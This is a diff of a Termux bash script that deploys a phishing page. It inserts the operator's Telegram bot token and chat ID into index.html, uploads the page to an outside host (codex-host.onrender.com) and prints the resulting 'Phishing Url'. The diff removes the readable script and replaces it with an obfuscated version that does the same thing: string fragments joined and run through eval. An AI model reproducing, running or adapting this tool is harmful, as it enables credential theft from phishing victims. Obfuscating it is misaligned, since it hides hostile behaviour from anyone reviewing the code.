@@ -1,72 +1,10 @@
-#!/bin/bash
-clear
-# dx color
-r='\033[1;91m'
-p='\033[1;95m'
-y='\033[1;93m'
-g='\033[1;92m'
-n='\033[1;0m'
-b='\033[1;94m'
-c='\033[1;96m'
-C='\033[1;92m[\033[1;00m</>\033[1;92m]\033[0m'
-D='\033[1;92m[\033[1;00m〄\033[1;92m]\033[0m'
-E='\033[1;92m[\033[1;00m×\033[1;92m]\033[0m'
-A='\033[1;92m[\033[1;00m+\033[1;92m]\033[0m'
-lm='\033[96m▱▱▱▱▱▱▱▱▱▱▱▱\033[0m〄\033[96m▱▱▱▱▱▱▱▱▱▱▱▱\033[1;00m'
-dm='\033[93m▱▱▱▱▱▱▱▱▱▱▱▱\033[0m〄\033[93m▱▱▱▱▱▱▱▱▱▱▱▱\033[1;00m'
+# [ CODER ] DX-CODEX
+# [ Telegram ] @Termuxcodex
+# [ THANKS TO ] ALLAH
+# [ ム ᴅx-ᴄᴏᴅᴇx ム ]
 
+# Github- https://github.com/Alpha-Codex369
 
-if command -v curl &>/dev/null; then
-    echo ""
-else
-    pkg install curl -y >/dev/null 2>&1
-fi
-clear
-if command -v jq &>/dev/null; then
-    echo ""
-else
-    pkg install jq -y >/dev/null 2>&1
-fi
-clear
-
-dxnetcheck() {
-clear
-echo
-echo -e "               ${g}╔═══════════════╗"
-echo -e "               ${g}║ ${n}</>  ${c}CODEX-X${g}  ║"
-echo -e "               ${g}╚═══════════════╝"
-echo -e "  ${g}╔════════════════════════════════════════════╗"
-echo -e "  ${g}║  ${C} ${y}Checking Your Internet Connection¡${g}  ║"
-echo -e "  ${g}╚════════════════════════════════════════════╝${n}"
-while true; do
-    curl --silent --head --fail https://github.com > /dev/null
-    if [ "$?" != 0 ]; then
-echo -e "              ${g}╔══════════════════╗"
-echo -e "              ${g}║${C} ${r}No Internet ${g}║"
-echo -e "              ${g}╚══════════════════╝"
-        sleep 2.5
-    else
-        break
-    fi
-done
-clear
-} ; dxnetcheck
-echo
-    echo ; echo -e "		        ${g}Hey ${y}Dear" ; echo -e "${c}              (\_/)" ; echo -e "              (${y}^ω^${c})     ${g}I'm Dx-Simu${c}" ; echo -e "             ⊂(___)づ  ⋅˚₊‧ ଳ ‧₊˚ ⋅"
-    echo ; echo -e " ${A} ${c}Please Enter Your ${g}Telegram Bot token \n ${A} ${c}And Your ${g}Chat Id ${c}\n"
-
-read -p "[+]─[Enter Token]──➤ " token ; read -p "[+]─[Enter ID]──➤ " chat_id
-
-index_file="index.html" ; sed -i "s/YOUR_BOT_TOKEN_HERE/$token/g" "$index_file"
-sed -i "s/YOUR_CHAT_ID_HERE/$chat_id/g" "$index_file"
-termux-reload-settings
-echo -e "\n ${A} ${c}Token and ID have been updated\n"
-if [[ -f "$index_file" && "$index_file" == *.html ]]; then
-    response=$(curl -s -F "file=@$index_file" https://codex-host.onrender.com/upload)
-
-    file_url=$(echo "$response" | jq -r '.fileUrl')
-    echo -e "\n ${A} ${y}Note & Save the URL given here. \n ${A} ${y}You can use the URL ${g}permanently \n" ; echo -e "\n ${D} ${c}Your Phishing Url: ${g}${file_url}\n${c}"
-        read -p "[+]─[Enter to back]──➤ "
-else
-    echo -e "\n ${E} ${r}File does not exist or is not an ${g}HTML file.\n"
-fi
+z="
+";OBz=' &>/';LGz='mane';nBz='-X${';tBz='{g}╔';AFz='}Tok';xBz='{y}C';MDz='{c} ';NBz='v jq';TEz='; se';FBz='pkg ';dDz='‧₊˚ ';rCz='══╝"';Uz='m[\0';CBz='echo';lFz=')';kEz='ID_H';eBz='${g}';vBz='  ${';vEz='gs';iEz='UR_C';xz='>/de';kCz='${C}';Jz='1;93';aGz='──➤ ';sBz='"  $';tFz=''\''.fi';bEz='$tok';Ez='1;91';Yz='m]\0';hFz='ende';Qz='1;94';vz='v cu';vDz='Chat';BGz=' the';IBz='curl';cFz='tps:';FEz='Toke';sDz='A} $';MEz=' cha';JCz='"';nFz='=$(e';oz='[1;0';nCz='Inte';Mz='n='\''\';BFz='en a';mBz='ODEX';SFz='l ]]';WCz='ail ';bBz=' -e ';qCz='}║"';cCz=' /de';ZGz='ack]';BDz=' ; e';iBz='║ ${';pFz='spon';Lz='1;92';wFz=' ${y';dEz='" "$';KCz='{g}╚';yEz=' ${c';YEz='_TOK';xDz='${c}';mz='▱▱▱▱';REz='x.ht';BEz=' -p ';JBz=' -y ';HDz='y}De';SGz='g Ur';kz='lm='\''';ZFz='ile=';ACz='ing ';ZBz='ck()';ABz='ll; ';Rz='c='\''\';TGz='l: $';uFz='leUr';NDz=' (\_';IGz=' can';bz='〄\03';uBz='{g}║';lz='[96m';gDz='} ${';JEz='n ; ';CCz=' Int';DFz='D ha';pDz=' tok';DGz=' giv';DCz='erne';kBz='>  $';XEz='_BOT';RFz='.htm';WFz='url ';uDz='nd Y';KBz='ll 2';fz='[0m'\''';XFz='-s -';TDz='})  ';FFz='een ';cBz='"   ';cGz='}Fil';kFz='load';QFz='== *';VEz=' "s/';Hz='1;95';uEz='ttin';YDz='c}" ';PEz='x_fi';VGz='{fil';RDz='y}^ω';WEz='YOUR';bDz=' ⋅˚₊';XDz='mu${';QGz=' Phi';SDz='^${c';Gz='p='\''\';Sz='1;96';IFz='n"';YFz='F "f';dFz='//co';gz='E='\''\';rz='[93m';QEz='le="';UCz='head';yz='v/nu';NFz='e" &';gGz='xist';TCz='t --';EEz='ter ';aFz='@$in';fCz=' "$?';SBz='en';NEz='t_id';tDz='{c}A';rEz='ux-r';mFz='_url';jGz='ot a';qFz='se" ';LEz='─➤ "';UDz='{g}I';PBz='dev/';qDz='en \';LCz='╝${n';KEz='ID]─';sCz='slee';ZEz='EN_H';BCz='Your';YCz='s://';xCz='done';xEz='${A}';dCz='ll';dBz='    ';JGz=' use';QBz='null';CGz=' URL';PCz='ue; ';HFz='ted\';fFz='host';Wz=';00m';UBz='y >/';Oz=''\''';hCz=' 0 ]';WGz='e_ur';yDz='\n"';oBz='g}  ';ez='\033';ZDz='⊂(__';pBz='║"';IEz='toke';HEz='➤ " ';Zz='33[0';oEz='dex_';JDz='; ec';sFz=' -r ';LFz='ndex';UFz='onse';ECz='t Co';NGz=' \n"';bFz='" ht';iz='A='\''\';QDz=' (${';iFz='r.co';YGz='to b';XGz='l}\n';lEz='$cha';oCz='rnet';KDz='ho -';jBz='n}</';gFz='.onr';RGz='shin';eEz='le"';SCz='ilen';mCz='}No ';WBz='1';uz='nd -';Tz='C='\''\';Kz='g='\''\';GEz='n]──';BBz='then';tz='omma';hBz='╗"';FCz='nnec';FGz='ere.';ADz='ck';lCz=' ${r';wz='rl &';KFz=' "$i';rDz='n ${';YBz='tche';XCz='http';aEz='ERE/';tCz='p 2.';cEz='en/g';eCz='if [';QCz='do';EGz='en h';Bz='r';OEz='inde';GCz='tion';jCz='══╗"';EBz='else';jFz='m/up';ZCz='gith';xFz='}Not';AEz='read';cz='3[1;';eFz='dex-';az='D='\''\';UGz='{g}$';HCz='¡${g';vCz='brea';Xz='</>\';aCz='ub.c';HBz='all ';iDz='ease';wCz='k';FDz='g}He';MGz='ntly';rFz='| jq';yCz='} ; ';OFz='& "$';sEz='eloa';pCz=' ${g';lBz='{c}C';Pz='b='\''\';oFz='"$re';OCz='e tr';HGz='}You';dz='92m]';dGz='e do';jEz='HAT_';MBz='fi';wEz='"\n ';wDz=' Id ';MCz='}"';VFz='=$(c';VCz=' --f';wBz='C} $';hEz='s/YO';JFz='[ -f';cDz='‧ ଳ ';mDz='Tele';rBz='╝"';Vz='33[1';qEz='term';Az='clea';VBz=' 2>&';PDz='e " ';lGz='ML f';ICz='}  ║';PFz='le" ';fEz='sed ';Nz='1;0m';SEz='ml" ';LBz='>&1';EDz='		  ';CEz='"[+]';TBz='jq -';MFz='_fil';gEz='-i "';GGz=' \n ';EFz='ve b';CFz='nd I';jz='+\03';KGz='}per';NCz='whil';hz='×\03';nz='[0m〄';VDz=''\''m D';kGz='g}HT';UEz='d -i';qBz='╚═══';lDz='our ';yFz='e & ';qz='dm='\''';fGz='ot e';Fz='m'\''';CDz='cho ';pEz='file';GBz='inst';Dz='033[';RBz='; th';IDz='ar" ';OGz='\n $';eDz='⋅"';Iz='y='\''\';nDz='gram';uCz='5';aBz=' {';Cz='r='\''\';GDz='y ${';AGz='Save';oDz=' Bot';hDz='c}Pl';vFz='l'\'')';iGz='is n';aDz='_)づ ';PGz='{D} ';eGz='es n';gCz='" !=';fBz='╔═══';iCz='   $';TFz='resp';yBz='heck';nEz='"$in';mEz='/g" ';WDz='x-Si';bGz='${E}';tEz='d-se';LDz='e "$';RCz=' --s';kDz='er Y';jDz=' Ent';sz='if c';hGz=' or ';ODz='/)" ';mGz='ile.';pz='0m'\''';DEz='─[En';DBz=' ""';gBz='════';fDz=' ${A';XBz='dxne';GFz='upda';bCz='om >';DDz='-e "';
+eval "$Az$Bz$z$Cz$Dz$Ez$Fz$z$Gz$Dz$Hz$Fz$z$Iz$Dz$Jz$Fz$z$Kz$Dz$Lz$Fz$z$Mz$Dz$Nz$Oz$z$Pz$Dz$Qz$Fz$z$Rz$Dz$Sz$Fz$z$Tz$Dz$Lz$Uz$Vz$Wz$Xz$Dz$Lz$Yz$Zz$Fz$z$az$Dz$Lz$Uz$Vz$Wz$bz$cz$dz$ez$fz$z$gz$Dz$Lz$Uz$Vz$Wz$hz$cz$dz$ez$fz$z$iz$Dz$Lz$Uz$Vz$Wz$jz$cz$dz$ez$fz$z$kz$ez$lz$mz$mz$mz$ez$nz$ez$lz$mz$mz$mz$ez$oz$pz$z$qz$ez$rz$mz$mz$mz$ez$nz$ez$rz$mz$mz$mz$ez$oz$pz$z$sz$tz$uz$vz$wz$xz$yz$ABz$BBz$z$CBz$DBz$z$EBz$z$FBz$GBz$HBz$IBz$JBz$xz$yz$KBz$LBz$z$MBz$z$Az$Bz$z$sz$tz$uz$NBz$OBz$PBz$QBz$RBz$SBz$z$CBz$DBz$z$EBz$z$FBz$GBz$HBz$TBz$UBz$PBz$QBz$VBz$WBz$z$MBz$z$Az$Bz$z$XBz$YBz$ZBz$aBz$z$Az$Bz$z$CBz$z$CBz$bBz$cBz$dBz$dBz$dBz$eBz$fBz$gBz$gBz$gBz$hBz$z$CBz$bBz$cBz$dBz$dBz$dBz$eBz$iBz$jBz$kBz$lBz$mBz$nBz$oBz$pBz$z$CBz$bBz$cBz$dBz$dBz$dBz$eBz$qBz$gBz$gBz$gBz$rBz$z$CBz$bBz$sBz$tBz$gBz$gBz$gBz$gBz$gBz$gBz$gBz$gBz$gBz$gBz$gBz$hBz$z$CBz$bBz$sBz$uBz$vBz$wBz$xBz$yBz$ACz$BCz$CCz$DCz$ECz$FCz$GCz$HCz$ICz$JCz$z$CBz$bBz$sBz$KCz$gBz$gBz$gBz$gBz$gBz$gBz$gBz$gBz$gBz$gBz$gBz$LCz$MCz$z$NCz$OCz$PCz$QCz$z$IBz$RCz$SCz$TCz$UCz$VCz$WCz$XCz$YCz$ZCz$aCz$bCz$cCz$yz$dCz$z$eCz$fCz$gCz$hCz$RBz$SBz$z$CBz$bBz$cBz$dBz$dBz$iCz$tBz$gBz$gBz$gBz$gBz$jCz$z$CBz$bBz$cBz$dBz$dBz$iCz$uBz$kCz$lCz$mCz$nCz$oCz$pCz$qCz$z$CBz$bBz$cBz$dBz$dBz$iCz$KCz$gBz$gBz$gBz$gBz$rCz$z$sCz$tCz$uCz$z$EBz$z$vCz$wCz$z$MBz$z$xCz$z$Az$Bz$z$yCz$XBz$YBz$ADz$z$CBz$z$CBz$BDz$CDz$DDz$EDz$dBz$vBz$FDz$GDz$HDz$IDz$JDz$KDz$LDz$MDz$dBz$dBz$dBz$NDz$ODz$JDz$KDz$PDz$dBz$dBz$dBz$QDz$RDz$SDz$TDz$iCz$UDz$VDz$WDz$XDz$YDz$JDz$KDz$PDz$dBz$dBz$dBz$ZDz$aDz$bDz$cDz$dDz$eDz$z$CBz$BDz$CDz$DDz$fDz$gDz$hDz$iDz$jDz$kDz$lDz$eBz$mDz$nDz$oDz$pDz$qDz$rDz$sDz$tDz$uDz$lDz$eBz$vDz$wDz$xDz$yDz$z$AEz$BEz$CEz$DEz$EEz$FEz$GEz$HEz$IEz$JEz$AEz$BEz$CEz$DEz$EEz$KEz$LEz$MEz$NEz$z$OEz$PEz$QEz$OEz$REz$SEz$TEz$UEz$VEz$WEz$XEz$YEz$ZEz$aEz$bEz$cEz$dEz$OEz$PEz$eEz$z$fEz$gEz$hEz$iEz$jEz$kEz$aEz$lEz$NEz$mEz$nEz$oEz$pEz$JCz$z$qEz$rEz$sEz$tEz$uEz$vEz$z$CBz$bBz$wEz$xEz$yEz$AFz$BFz$CFz$DFz$EFz$FFz$GFz$HFz$IFz$z$eCz$JFz$KFz$LFz$MFz$NFz$OFz$OEz$PEz$PFz$QFz$RFz$SFz$RBz$SBz$z$TFz$UFz$VFz$WFz$XFz$YFz$ZFz$aFz$oEz$pEz$bFz$cFz$dFz$eFz$fFz$gFz$hFz$iFz$jFz$kFz$lFz$z$pEz$mFz$nFz$CDz$oFz$pFz$qFz$rFz$sFz$tFz$uFz$vFz$z$CBz$bBz$wEz$xEz$wFz$xFz$yFz$AGz$BGz$CGz$DGz$EGz$FGz$GGz$xEz$wFz$HGz$IGz$JGz$BGz$CGz$pCz$KGz$LGz$MGz$NGz$BDz$CDz$DDz$OGz$PGz$xDz$BCz$QGz$RGz$SGz$TGz$UGz$VGz$WGz$XGz$xDz$JCz$z$AEz$BEz$CEz$DEz$EEz$YGz$ZGz$aGz$JCz$z$EBz$z$CBz$bBz$wEz$bGz$lCz$cGz$dGz$eGz$fGz$gGz$hGz$iGz$jGz$rDz$kGz$lGz$mGz$yDz$z$MBz"
